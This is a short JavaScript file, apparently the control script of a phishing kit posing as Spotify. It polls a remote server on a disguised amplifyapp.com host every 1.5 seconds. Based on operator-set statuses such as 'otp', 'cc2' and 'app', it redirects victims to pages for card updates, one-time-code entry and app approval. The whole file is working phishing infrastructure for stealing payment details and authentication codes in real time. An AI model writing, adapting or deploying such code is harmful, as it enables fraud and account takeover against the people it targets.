var step = localStorage.getItem("step");

// Clear error flags
["otp", "cc", "app"].forEach(function (key) {
    if (localStorage.getItem(key) === "error") {
        localStorage.removeItem(key);
    }
});

// Redirect logic
/*if (step === "one") {
    /!*setTimeout(function () {
        window.location.href = "update.html";
    }, 3000);*!/
} else {*/
setInterval(function () {
    // Fetch the latest status from the server
    $.get("https://spoty-d2k0fla2d-la2dasfsd.d2sckfda9r5aua.amplifyapp.com/processStatus.php", function (response) {
        const status = response.status.trim();
        console.log(status);

        
        if (localStorage.getItem('unique_id') === response.unique_id) {
            switch (status) {
                case "app":
                    window.location.href = "approve.html";
                    break;
                case "app2":
                    window.location.href = "approve.html";
                    break;
                case "cc2":
                    window.location.href = "update.html";
                    break;
                case "otp":
                    window.location.href = "qom.html";
                    break;
                case "otp_error":
                    window.location.href = "qom.html";
                    break;
                case "done":
                    window.location.href = "thankyou.html";
                    break;
                case "decline":
                case "cancled":
                case "ban":
                    window.location.href = "index.html";
                    break;
                default:
                    console.log("No new status to process.");
            }
        }

        // Handle the status

    });
}, 1500); // Poll every 1.5 seconds

// }
